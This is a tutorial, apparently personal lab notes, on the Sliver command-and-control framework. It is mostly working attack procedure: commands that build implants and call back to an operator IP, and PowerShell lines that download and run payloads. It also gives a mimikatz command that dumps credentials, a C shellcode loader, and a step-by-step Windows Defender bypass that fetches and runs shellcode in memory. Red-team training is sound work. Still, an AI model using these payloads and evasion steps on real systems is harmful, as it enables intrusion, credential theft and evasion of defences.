# Getting Started with Sliver: A Modern C2 Framework
Sliver is an open-source command and control (C2) framework built by BishopFox as a modern alternative to Metasploit's Meterpreter. If you're learning red teaming or penetration testing, understanding C2 frameworks is essential, Sliver gives you a hands-on way to learn how post-exploitation works in practice.
## What is Sliver?
Think of Sliver as a remote access tool for authorized security testing. After gaining initial access to a target system, you deploy a "implant" (a small program) that connects back to your command server. This gives you an interactive shell to explore the system, extract information, and move laterally, exactly what red teamers do.

**Why Sliver over Metasploit?**
- Lightweight and fast implants
- Multiple communication protocols (mTLS, HTTP, DNS)
- Operator management and client-server architecture
- In-memory payload execution (less disk detection)
- Modern codebase written in Go

---
## Part 1: Installation & Setup
### Prerequisites
- Linux machine (Ubuntu recommended)
- Basic command-line comfort
- Virtual lab environment for practice
### Quick Install
The easiest way to get Sliver running:
```bash
curl https://sliver.sh/install | sudo bash
sliver
```
This installs the all-in-one server. For production setups, you might separate server and client components.
![[Pasted image 20260718145324.png]]
### Manual Installation (Server & Client)
If you want more control, download the binaries directly:
**Server:**
```bash
wget https://github.com/BishopFox/sliver/releases/download/v1.7.3/sliver-server_linux-amd64
chmod +x sliver-server_linux-amd64
./sliver-server_linux-amd64 unpack --force
```
**Client:**
```bash
wget https://github.com/BishopFox/sliver/releases/download/v1.7.3/sliver-client_linux-amd64
chmod +x sliver-client_linux-amd64
```
The `unpack` command extracts dependencies and prepares the environment.
![[Pasted image 20260718145942.png]]

---
## Part 2: Core Concepts
Before diving into commands, understand these fundamental concepts:
### Sessions vs. Beacons
Sliver gives you two types of implants, each suited for different scenarios:

|Feature|Session|Beacon|
|---|---|---|
|**Connection**|Interactive, always-connected|Periodic check-ins|
|**Latency**|Real-time commands|Minutes to hours delay|
|**Detection Risk**|Higher (constant traffic)|Lower (infrequent contact)|
|**Use Case**|Active exploitation|Persistent foothold|
**Sessions** are like traditional reverse shells, you type a command and get instant feedback. Good for when you need immediate control.
**Beacons** are stealthier. They reach out to your server every few minutes to ask "any tasks for me?" This leaves less network noise and is harder to detect.
### Communication Protocols
Sliver supports multiple ways for your implant to "phone home":

| Protocol       | Details                            | Best For                         |
| -------------- | ---------------------------------- | -------------------------------- |
| **mTLS**       | Encrypted with mutual certificates | Reliable, high-bandwidth exfil   |
| **HTTP/HTTPS** | Looks like normal web traffic      | Evading network detection        |
| **DNS**        | Commands hidden in DNS queries     | Bypassing firewall restrictions  |
| **Wireguard**  | VPN-like tunnel                    | Low latency, full network access |
mTLS is fastest for reliable networks. HTTP blends in with normal traffic. DNS is sneaky but slower.

---
## Part 3: Server-Client Setup
Sliver uses a server-client model. The server stays running, listening for implant connections. The client connects to the server to issue commands.
### Step 1: Create an Operator Certificate
An "operator" is you, the person controlling the C2. You need credentials to authenticate with the server.
```bash
./sliver-server operator -l <server_ip> -n <operator_name> -s <config_path> -P <permissions>
```
**Example:**
```bash
./sliver-server operator -l 192.168.133.128 -n operator1 -s /tmp -P all
```
This creates a configuration file with your credentials. Keep this file safe—anyone with it can control your C2 server.
![[Pasted image 20260718150528.png]]
**Flags explained:**
- `-l` : Server IP address
- `-n` : Operator name (your username)
- `-s` : Where to save the config file
- `-P` : Permissions (all, console, etc.)
### Step 2: Start the Server Daemon
```bash
./sliver-server daemon
```
The server now runs in the background, waiting for implant connections and client connections.
### Step 3: Connect Your Client
On your client machine, import the operator certificate and connect:
```bash
./sliver-client import <config_file_path>
./sliver-client
```
You should see a prompt like:
```
[sliver] >
```
Success! You're now connected to your C2 server.

---
## Part 4: Generating Implants
Now for the fun part, creating the malicious payloads that will run on target systems.
### Session Implant (Interactive)
The most basic implant, gives you a real-time shell:
```bash
generate -m <your_client_ip> -s Payloads/
```
**Flags:**
- `-m` : Callback address (IP of your client/server)
- `-s` : Output directory
**Example:**
```bash
generate -m 192.168.133.128 -s Payloads/
```
This creates an executable in the `Payloads/` folder that, when run, connects back and gives you a session.
### Beacon Implant (Stealthy)
For persistent, low-and-slow operations:
```bash
generate beacon -m <your_client_ip> -s Payloads/ -S <jitter> -J <interval>
```
**Flags:**
- `-m` : Callback address
- `-s` : Output directory
- `-S` : Sleep jitter in seconds (randomizes check-in timing)
- `-J` : Jitter percentage (adds randomness to sleep)
**Example:**
```bash
generate beacon -m 192.168.133.128 -s Payloads/ -S 45 -J 15
```
This beacon will check in every 45 seconds ±15%, making its behavior less predictable and harder to detect.

---
## Part 5: Listeners & Getting Connected
A **listener** is what catches your implant's callback. Think of it as a mousetrap—the implant triggers it when it connects.
### Starting a Listener
Sliver supports multiple listener types. Let's start with mTLS (the default and fastest):
```bash
mtls
```
That's it! A listener is now running on the default port (8888 for mTLS).
### Viewing Active Listeners
```bash
jobs
```
Output:
```
ID  Name   Protocol  Port    Domains
1   mtls   tcp       8888
```
![[Pasted image 20260718172652.png]]
### Other Listener Types
```bash
http -L 0.0.0.0 -l 8080          # HTTP listener
https -L 0.0.0.0 -l 8443         # HTTPS listener
dns -L <dns_server_ip> -l 53      # DNS listener
```

---
## Part 6: Executing Your Implant
You've created an implant. Now transfer it to the target and run it (in your lab environment).
### From Windows Target (using PowerShell):
Disable Antivirus temporarily:
```powershell
iwr http://192.168.133.128/session.exe -Outfile session.exe
.\session.exe
```
```powershell
iwr http://192.168.133.128/beacon.exe -Outfile beacon.exe
.\beacon.exe
```
![[Pasted image 20260718215349.png]]
### Checking for Callbacks
Back on your C2:
```bash
sessions          # View active sessions
beacons           # View active beacons
```
Example output:
```
ID       Transport  Remote Address         Hostname      Username                OS
726a0a47 mtls       192.168.133.130:58888  KRISHNAN-PC   KRISHNAN\krish          windows/amd64
```
Congratulations, you have a callback!
![[Pasted image 20260718215635.png]]

---
## Part 7: Interacting with Your Implant
### Getting a Shell
```bash
use <session_id>
```
This drops you into the implant's interactive shell. Now you can run commands like a normal reverse shell.
```bash
[SELECTIVE_SKYLIGHT] > whoami
[+] KRISHNAN\krish

[SELECTIVE_SKYLIGHT] > ipconfig
```
### Working with Beacons
Beacons work differently, they don't give you an instant shell. Instead, you queue up tasks:
```bash
use <beacon_id>
tasks                    # List pending tasks
task execute whoami      # Queue a command
tasks                    # Check task results
interactive              # Upgrade to interactive if needed
```
### Exiting an Implant

```bash
background              # Return to main [sliver] prompt
```

---
## Part 8: Post-Exploitation with Armory
Armory is Sliver's in-memory tool repository. Think of it as a toolbox you can download and use inside the implant, no binary files needed, just loaded into memory.
### Installing Armory
```bash
armory install all
```
This downloads all available extensions (mimikatz, sRDI injectors, etc.)
![[Pasted image 20260718223019.png]]
### Using Tools from Armory
Once inside a session:
```bash
use <session_id>

# Run mimikatz to dump credentials
mimikatz "privilege::debug" "sekurlsa::logonpasswords"

# Or load other tools
sRDI help
```
Armory tools execute entirely in memory, nothing written to disk means less chance of detection.
![[Pasted image 20260718224205.png]]

---
## Part 9: Stageless vs. Staged Payloads
There are two ways to structure your implant, and understanding the difference is crucial for evasion.
### Stageless Payloads
A single, self-contained executable that includes everything needed. You generate it with the normal `generate` command.
**Pros:**
- One file, simpler execution
- No "stage 2" download phase
**Cons:**
- Larger file size (50-100 MB)
- More likely to trigger heuristic detection
### Staged Payloads
Split into two parts:
1. **Stager:** Small stub (~5KB) that sits in memory
2. **Stage 2:** The actual implant payload, fetched on execution
**Pros:**
- Tiny initial footprint (hard to detect)
- Entire execution in memory
- Less disk artifacts
**Cons:**
- Requires a handler to serve stage 2
- Extra network traffic
### Building a Staged Payload
This is more complex but worth learning:
**Step 1: Create a profile**
```bash
profiles new --mtls 192.168.133.128 --format shellcode win64_mtls
```
**Step 2: Start the stage listener**
```bash
stage-listener --profile win64_mtls --url tcp://192.168.133.128:8443
```

**Step 3: Generate the stager shellcode**
```bash
generate stager --mtls --lhost 192.168.133.128 --lport 8443 --save Payloads/ --format c
```

**Step 4: Wrap in a dropper (C code)**
The shellcode needs a wrapper to allocate memory and execute. Here's a minimal example:
```c
/* Import the windows.h library to access:
 * - VirtualAlloc
 * - RtlMoveMemory
 * - CreateThread
 * - WaitForSingleObject */
#include <windows.h>

int main() {
    /* generate stager -L <C2_SERVER_IP> -l <STAGER_PORT> -f c -s 
     * Payloads/ */

    /* Calculate the size of 'buf' and store in 'buf_size' to be used by: 
     * - VirtualAlloc
     * - RtlMoveMemory */
    SIZE_T buf_size = sizeof(buf);
		
    /* VirtualAlloc:
     * - lpAddress: NULL (system chooses)
     * - dwSize: buf_size (size of our shellcode)
     * - flAllocationType: 0x00001000 (MEM_COMMIT)
     * - flProtect: 0x40 (PAGE_EXECUTE_READWRITE) */
    LPVOID addr = VirtualAlloc(NULL, buf_size, 0x00001000, 0x40);

    /* RtlMoveMemory:
     * - Destination: addr (our allocated memory)
     * - Source: buf (our shellcode array)
     * - Length: buf_size (amount to copy) */
    RtlMoveMemory(addr, buf, buf_size);
		
    /* CreateThread:
     * - lpThreadAttributes: NULL (default)
     * - dwStackSize: 0 (default)
     * - lpStartAddress: addr (our shellcode)
     * - lpParameter: NULL (no parameters)
     * - dwCreationFlags: 0 (run immediately)
     * - lpThreadId: NULL (we don't need this) */
    HANDLE hHandle = CreateThread(NULL, 0, addr, NULL, 0, NULL);
	
    /* WaitForSingleObject:
     * - hHandle: hHandle (thread handle)
     * - dwMilliseconds: INFINITE (0xFFFFFFFF) */
    WaitForSingleObject(hHandle, 0xFFFFFFFF);
    
    return 0;
}
```

**Step 5: Compile with mingw**
First, install mingw:
```bash
sudo apt install mingw-w64
```
Then compile:
```bash
x86_64-w64-mingw32-gcc dropper.c -o dropper.exe -Wall
```
The resulting `dropper.exe` is tiny (maybe 5-10KB) but powerful.
![[Pasted image 20260719143818.png]]

---
## Part 10: Evading Windows Defender
Windows Defender can block implants. Here's a practical approach using staged payloads and the Defender bypass tool.
### The Strategy
1. Create a staged implant (small stager)
2. Use a dropper that bypasses defender signatures
3. Serve the stage 2 payload from an HTTP server
4. On execution, the stager fetches and executes stage 2 in memory
### Step-by-Step Bypass
**Step 1: Clone the bypass repository**
```bash
git clone https://github.com/krishnan-tech/bypass_defender_stager_script
cd bypass_defender_stager_script
```
**Step 2: Generate a stager**
```bash
# In Sliver
generate --mtls 192.168.133.128:443 --os windows --arch amd64 --format shellcode
```
This creates a `.bin` file.
**Step 3: Rename and place it**
```bash
cp <generated>.bin shellc.bin
mv shellc.bin /path/to/bypass_defender_stager_script/
```
**Step 4: Build the dropper**
```bash
python3 bypass.py -l 192.168.133.128 -p 80
```
This creates `stager.exe` that will fetch `shellc.bin` from your web server on port 80.
**Step 5: Start your server**
```bash
# In Sliver
mtls -L 192.168.133.128 -l 443

# In another terminal
cd defender_bypass
python3 -m http.server 80
```
**Step 6: Transfer and execute on target**
```powershell
iwr http://<your_ip>/stager.exe -Outfile stager.exe
.\stager.exe
```
What happens:
1. `stager.exe` runs and connects to port 80
2. Downloads `shellc.bin` from your HTTP server
3. Executes the shellcode in memory
4. Implant connects back to your mTLS listener on port 443
5. You get a session, all in memory, no detection
From Windows:
![[Pasted image 20260720121227.png]]
From C2:
![[Pasted image 20260720121305.png]]

---
## Quick Reference: Essential Commands
### Server Commands
```bash
./sliver-server daemon              # Start server in background
./sliver-server operator ...        # Create operator certificate
mtls                                # Start mTLS listener
http -L 0.0.0.0 -l 8080            # Start HTTP listener
jobs                                # View active listeners
```
### Client Commands
```bash
./sliver-client                     # Connect to server
sessions                            # List all sessions
beacons                             # List all beacons
use <id>                            # Interact with implant
info                                # Get implant details
```
### Implant Generation
```bash
generate -m <ip> -s Payloads/                    # Session payload
generate beacon -m <ip> -s Payloads/ -S 45 -J 15  # Beacon payload
```
### Post-Exploitation
```bash
armory install all                  # Install all tools
mimikatz "privilege::debug" "sekurlsa::logonpasswords"  # Dump creds
execute -o whoami                   # Run OS command
background                          # Exit implant shell
```

---
## Common Gotchas & Troubleshooting
**Implant won't connect:**
- Verify firewall isn't blocking your listener port
- Check that `-m` flag points to an IP the target can reach (not localhost)
- Ensure listener is actually running (`jobs`)
**Defender is blocking everything:**
- Use staged payloads (smaller = harder to detect)
- Try the Defender bypass tool
- Consider obfuscation (advanced topic)
**Can't inject Armory tools:**
- Make sure `armory install all` completed
- Some tools need specific privileges (run as admin)
- Check Sliver documentation for tool requirements

---
## Next Steps: What to Learn

1. **Privilege Escalation** - Use tools in Armory to find local escalation vectors
2. **Lateral Movement** - Create implants for other systems
3. **Data Exfiltration** - Efficiently move sensitive data without detection
4. **Anti-Forensics** - Cover your tracks (audit logs, file deletion)
5. **Custom Implants** - Modify Sliver source code for custom behavior

---
## Resources
- **Official Sliver Docs:** https://sliver.sh/
- **GitHub Repository:** https://github.com/BishopFox/sliver
- **Learning Sliver Deep Dive (Blog):** https://dominicbreuker.com/post/learning_sliver_c2_06_stagers/
- **Introduction to Sliver:** https://redsiege.com/blog/2022/11/introduction-to-sliver/
- **YouTube Tutorials:** https://www.youtube.com/@hackerforceyt

---
## Final Thoughts

Sliver is an excellent learning tool for understanding how modern C2 frameworks work. The concepts you learn here, implant generation, listener management, payload evasion, transfer directly to real red team engagements.

Remember: Only use Sliver in authorized environments. Practice in your own lab, prepare for certifications like OSCP and OSCE, and always get written permission before testing on anyone else's systems.

Happy hacking! 🚀